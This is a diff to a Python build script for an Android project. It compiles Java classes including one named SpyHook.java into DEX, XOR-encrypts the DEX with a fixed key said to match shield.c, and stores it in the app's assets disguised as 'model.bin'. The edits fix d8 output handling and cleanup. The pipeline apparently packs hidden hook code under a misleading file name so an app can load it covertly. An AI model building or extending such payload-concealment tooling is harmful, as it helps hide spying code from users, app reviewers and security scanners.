@@ -9,7 +9,7 @@ SOURCES = [
     os.path.join(HERE, "SpyHook.java"),
 ]
 TMP_CLASSES = os.path.join(HERE, "tmp_classes")
-TMP_DEX = os.path.join(HERE, "tmp.dex")
+TMP_DEX_DIR = os.path.join(HERE, "tmp_dex")
 OUT = os.path.join(ASSETS, "model.bin")
 
 # Key must match shield.c
@@ -80,17 +80,28 @@ def main():
         sys.exit(1)
 
     # DEX the compiled classes
+    os.makedirs(TMP_DEX_DIR, exist_ok=True)
     if dexer.endswith("d8"):
-        cmd = [dexer, "--lib", android_jar, "--output", TMP_DEX, TMP_CLASSES]
+        cmd = [dexer, "--lib", android_jar, "--min-api", "28", "--output", TMP_DEX_DIR, TMP_CLASSES]
     else:
-        cmd = [dexer, "--dex", "--output", TMP_DEX, TMP_CLASSES]
+        cmd = [dexer, "--dex", "--output", TMP_DEX_DIR, TMP_CLASSES]
     r = subprocess.run(cmd, capture_output=True, text=True)
     if r.returncode != 0:
         print(f"FAIL: dexer error:\n{r.stderr}")
         sys.exit(1)
 
+    # Find the generated DEX (d8 outputs a named file like classes.dex)
+    dex_file = None
+    for fname in os.listdir(TMP_DEX_DIR):
+        if fname.endswith(".dex"):
+            dex_file = os.path.join(TMP_DEX_DIR, fname)
+            break
+    if not dex_file:
+        print(f"FAIL: no .dex file found in {TMP_DEX_DIR}")
+        sys.exit(1)
+
     # Read and XOR encrypt
-    with open(TMP_DEX, "rb") as f:
+    with open(dex_file, "rb") as f:
         data = f.read()
     encrypted = bytes(data[i] ^ KEY[i & 7] for i in range(len(data)))
     with open(OUT, "wb") as f:
@@ -99,10 +110,9 @@ def main():
     print(f"OK: {len(data)} bytes DEX -> {OUT} ({len(encrypted)} encrypted)")
 
     # Cleanup
-    if os.path.isdir(TMP_CLASSES):
-        shutil.rmtree(TMP_CLASSES)
-    if os.path.isfile(TMP_DEX):
-        os.remove(TMP_DEX)
+    for p in [TMP_CLASSES, TMP_DEX_DIR]:
+        if os.path.isdir(p):
+            shutil.rmtree(p)
 
 if __name__ == "__main__":
     main()
